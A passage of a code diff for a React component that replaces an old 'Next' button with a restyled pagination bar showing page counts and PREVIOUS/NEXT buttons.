-            className="px-3 py-1.5 rounded-xl border border-card-border bg-card text-xs font-semibold disabled:opacity-40"
-          >
-            Next
-          </button>
-        </div>
-      )}
+        {/* Pagination */}
+        {totalPages > 1 && (
+          <div className="flex items-center justify-between pt-4 border-t border-border">
+            <span className="meta text-xs">
+              PAGE {currentPage} OF {totalPages} ({displayed.length} TOTAL)
+            </span>
+            <div className="flex items-center gap-2">
+              <button
+                onClick={() => setCurrentPage((p) => Math.max(1, p - 1))}
+                disabled={currentPage === 1}
+                className="action-btn disabled:opacity-40"
+              >
+                PREVIOUS
+              </button>
+              <button
+                onClick={() => setCurrentPage((p) => Math.min(totalPages, p + 1))}
+                disabled={currentPage === totalPages}
+                className="action-btn disabled:opacity-40"
+              >
+                NEXT
+              </button>
+            </div>
+          </div>
+        )}
+      </div>
     </Layout>
   );
 }
